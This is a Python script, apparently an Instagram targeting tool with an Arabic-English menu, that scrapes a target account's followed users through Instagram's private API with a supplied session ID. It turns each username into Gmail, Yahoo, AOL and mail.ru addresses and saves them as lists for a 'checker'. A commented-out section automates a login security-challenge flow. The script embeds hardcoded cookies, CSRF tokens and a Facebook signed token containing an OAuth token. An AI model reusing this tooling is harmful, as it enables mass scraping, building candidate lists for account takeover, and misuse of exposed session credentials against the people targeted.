#	            'cookie': 'ig_nrcb=1; mid=Yn0mhAABAAF67zpxcopyc_DiDqlW; ig_did=66C4F652-81B2-40FB-AD7E-98260457287F; fbm_124024574287414=base_domain=.instagram.com; csrftoken=XI40j24FspumJDJthA68V2BfF4os6ks2; fbsr_124024574287414=ifeY5-BW4tQiw5MZ8mMrijFr-SZW7gh3I2pgGbpO5rU.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRRGdpT2xHLUY2SmdZZG5MWjlKMnVWTXVDMHVIWWtjZmVYTkIxa3NKclJRejBEblM5ZXRIbC1YS19mWWE2OG5FRFVOdDBzcGJSdjVCQTNzZWc3ZlAwNy0xX2VfendZSXUybHIwdnVPUnA5eWRWY29Ncm1ZZThJcmotdmF5ejBVYWs2VXhHQnFWMHBvaTBleEgtSFN4RTdocXBzTENKcE9IbkVWbXZlLUdpMU1MVkdTb2U0U1l0QXh4ajhCQ01CVGxvdk5DbW5ienlFQWxyTC1BT2xMVU5GWVcteGd3QUlSX09LM3duU29WbzlqVmtpV2hXd1ZYa1NVVzY4LW9UQ0pxM0YzZ3NRWWp4bENSblVHXzJmZkwxa1pvTFdQektWYjBmTzY4YmpoeFhuRXdtVWltWWE2YVhJSDVUN1FONmhpNlBZIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUpQdmM1YlV2Z01CcVdIdlZSWkE4RXJIZ2xDYW5uUjFkSkVxQklOUFBNYWhzbHJyanMzcW03Zk9BWEhLU2RhY24wU2dkRVFKS1c3amVrYkdNMXduWkFBWkN5ZDVrN25xcGFLaThuanI3a2l3V1F2T0pkc2JIdHJjSDlNSExNdG5JbUlqaENaQ2IwTlJDV2x4MFpCOEkwSTZ6TUVwY3JSc0ViMXhMTkVoRDIxcDNURUZmRGpnWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY1MjUzNjA3OH0,',
#	            'origin': 'https://www.instagram.com/',
#	            'referer': 'https://www.instagram.com/',
#	            
#	            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
#	            'sec-ch-ua-mobile': '?0',
#	            'sec-fetch-dest': 'empty',
#	            'sec-fetch-mode': 'cors',
#	            'sec-fetch-site': 'same-origin',
#	            'user-agent': generate_user_agent(),
#	            'x-asbd-id': '198387',
#	            'x-csrftoken': 'XI40j24FspumJDJthA68V2BfF4os6ks2',
#	            
#	            'x-ig-app-id': '936619743392459',
#	            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
#	            'x-instagram-ajax': '9bcc5b5208c5',
#	            'x-requested-with': 'XMLHttpRequest'
#	        }
#	        
#    	
#    	data11 = {
#    		'choice': '1'
#    	
#    	}
#    	
#    	
#    	Rq = requests.post(Uq,headers=head11,data=data11).json()
#    
#    	
#    	r8=str(Rq['challenge']['challenge_context'])
#    	if ('"user_id"') in r8:
#    		Ha = r8.split(':')
#    		
#    		print(Ha)
#    	
#    	
#    	#print(r8)
#    	exit()
#    	C = input(f'[+] - {r8} : \n')
#    	
#    	#r88=str(Rq['challenge']['extraData']['content'][0]['text'])
#    	Cod = input(f'{r8} \n')
#    	print(Cod)
#    	#print(r8)
#    	Uqq = (Uq)
#    	head11 = {
#	            'accept': '*/*',
#	            'accept-encoding': 'gzip, deflate, br',
#	            'accept-language': 'en-US,en;q=0.9',
#	            'content-length': '8',
#	            'content-type': 'application/x-www-form-urlencoded',
#	            'cookie': 'ig_nrcb=1; mid=Yn0mhAABAAF67zpxcopyc_DiDqlW; ig_did=66C4F652-81B2-40FB-AD7E-98260457287F; fbm_124024574287414=base_domain=.instagram.com; csrftoken=XI40j24FspumJDJthA68V2BfF4os6ks2; fbsr_124024574287414=ifeY5-BW4tQiw5MZ8mMrijFr-SZW7gh3I2pgGbpO5rU.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRRGdpT2xHLUY2SmdZZG5MWjlKMnVWTXVDMHVIWWtjZmVYTkIxa3NKclJRejBEblM5ZXRIbC1YS19mWWE2OG5FRFVOdDBzcGJSdjVCQTNzZWc3ZlAwNy0xX2VfendZSXUybHIwdnVPUnA5eWRWY29Ncm1ZZThJcmotdmF5ejBVYWs2VXhHQnFWMHBvaTBleEgtSFN4RTdocXBzTENKcE9IbkVWbXZlLUdpMU1MVkdTb2U0U1l0QXh4ajhCQ01CVGxvdk5DbW5ienlFQWxyTC1BT2xMVU5GWVcteGd3QUlSX09LM3duU29WbzlqVmtpV2hXd1ZYa1NVVzY4LW9UQ0pxM0YzZ3NRWWp4bENSblVHXzJmZkwxa1pvTFdQektWYjBmTzY4YmpoeFhuRXdtVWltWWE2YVhJSDVUN1FONmhpNlBZIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUpQdmM1YlV2Z01CcVdIdlZSWkE4RXJIZ2xDYW5uUjFkSkVxQklOUFBNYWhzbHJyanMzcW03Zk9BWEhLU2RhY24wU2dkRVFKS1c3amVrYkdNMXduWkFBWkN5ZDVrN25xcGFLaThuanI3a2l3V1F2T0pkc2JIdHJjSDlNSExNdG5JbUlqaENaQ2IwTlJDV2x4MFpCOEkwSTZ6TUVwY3JSc0ViMXhMTkVoRDIxcDNURUZmRGpnWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY1MjUzNjA3OH0,',
#	            'origin': 'https://www.instagram.com/',
#	            'referer': 'https://www.instagram.com/',
#	            
#	            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
#	            'sec-ch-ua-mobile': '?0',
#	            'sec-fetch-dest': 'empty',
#	            'sec-fetch-mode': 'cors',
#	            'sec-fetch-site': 'same-origin',
#	            'user-agent': generate_user_agent(),
#	            'x-asbd-id': '198387',
#	            'x-csrftoken': 'XI40j24FspumJDJthA68V2BfF4os6ks2',
#	            
#	            'x-ig-app-id': '936619743392459',
#	            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
#	            'x-instagram-ajax': '9bcc5b5208c5',
#	            'x-requested-with': 'XMLHttpRequest'
#	        }
#	        
#    	
#    	data11 = {
#    		'security_code': C
#    	
#    	}
#    	
#    	
#    	Rqq = requests.post(Uqq,headers=head11,data=data11).json()
#    	print(Rqq)
#    	
#    	
#    	
#    else:
#    	print('\033[1;34m[!] - No Login')
#    	system('clear')
#    	while True:
#    		zaid9()

def Cl():
        global a,z,t,x
        cookies =input("🔹 \033[1;33mSessionid - \033[1;32mاضف سيشن ايدي هنا  : ")
        
        iii = input('\033[1;33m🔹Enter Your User list - \033[1;32mاضف يوزر لسحب لستة : \n')
        url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
        head1 = {
	            'accept': '*/*',
	            'accept-encoding': 'gzip, deflate, br',
	            'accept-language': 'en-US,en;q=0.9',
	            'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
	            'referer': 'https://www.instagram.com/{}/'.format(iii),
	            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
	            'sec-ch-ua-mobile': '?0',
	            'sec-fetch-dest': 'empty',
	            'sec-fetch-mode': 'cors',
	            'sec-fetch-site': 'same-origin',
	            'user-agent': generate_user_agent(),
	            'x-asbd-id': '437806',
	            'x-ig-app-id': '936619743392459',
	            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
	            'x-requested-with': 'XMLHttpRequest'
	        }
	    
        
        
        try:
        	rr = r.get(url22,headers=head1).json()
        	
        except json.decoder.JSONDecodeError as error:
        	system('clear')
        	print('* \033[1;32mBloked or Band Account')
        	exit()
        	
        try:
         fol = str(rr['graphql']['user']['edge_follow']['count'])
         idd = str(rr['logging_page_id'])
         ss = idd.split('_')[1]
        except KeyError as error :
             print('plsess user True...!')
             time.sleep(1)
             system('clear')
             while True:
             	Cl()
             #exit()
        x = int(fol)
        url4 = f'https://i.instagram.com/api/v1/friendships/{ss}/following/?count={fol}'
        head4 ={
	            'accept': '*/*',
	            'accept-encoding': 'gzip, deflate, br',
	            'accept-language': 'en-US,en;q=0.9',
	            'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
	            'referer': 'https://www.instagram.com/',
	            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
	            'sec-ch-ua-mobile': '?0',
	            'sec-fetch-dest': 'empty',
	            'sec-fetch-mode': 'cors',
	            'sec-fetch-site': 'same-origin',
	            'user-agent': generate_user_agent(),
	            'x-asbd-id': '437806',
	            'x-ig-app-id': '936619743392459',
	            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
	            'x-requested-with': 'XMLHttpRequest'
	
	        }
        data4 ={
        	'count': fol
	        }
        re = requests.get(url4,headers=head4,data=data4).json()
      
        try:
        	for zaid in range(0,x):
        	    us = str(re['users'][zaid]['username'])
	            a+=1 
	            os.system('cls' if os.name == 'nt' else'clear')
	
	            print(f'\033[1;35m[=] - Done >> [{a}]\n[=] - User >> \033[1;36m[{us}]\n\033[1;35m[=] - Time >> [{ll}]\n\033[1;32m[=] - Telegram : @MVMVP - @W_Y67')
	            Rq = ['@gmail.com']
	            Tq = random.choice(Rq)
	           
	             
	            with open('gmail.txt','a') as f9:
	                f9.write(f'{us}@gmail.com\n')
	            with open('yahoo.txt','a') as f6:
	            	f6.write(f'{us}@yahoo.com\n')
	            with open('aol.txt','a') as f1:
	            	f1.write(f'{us}@aol.txt\n')
	            with open('ru.txt','a') as f5:
	            	f5.write(f'{us}@mail.ru\n')
	            
	              
        except IndexError as error :
	        print('Error...Tools')
	        exit()

def O():
	try:
		os.remove('gmail.txt')
		os.remove('aol.txt')
		os.remove('yahoo.txt')
		os.remove('ru.txt')
		
		
		
		
		#os.remove('cookies.txt')
		
		print('Done')
	except FileNotFoundError as error:
		system('clear')
		print('Error')
		exit()


print('\033[1;32m[1] - List Username - انشاء لستة\n[2] - Checker List - فحص لستة\n[3] - Remov File - حدف لستة\n')
try:
	H = int(input('\033[1;35m[!] - Enter Your : '))
	system("clear")
except ValueError as error:
	system('clear')
	print('Error - لا يجوز اختيار احرف')
	exit()
if H ==1:
		Cl()
elif H==2:
	Gmail()
		
		
elif H==3:
	O()

else:
	system('clear')
	print('Error - اختيار خطأ')
	exit()


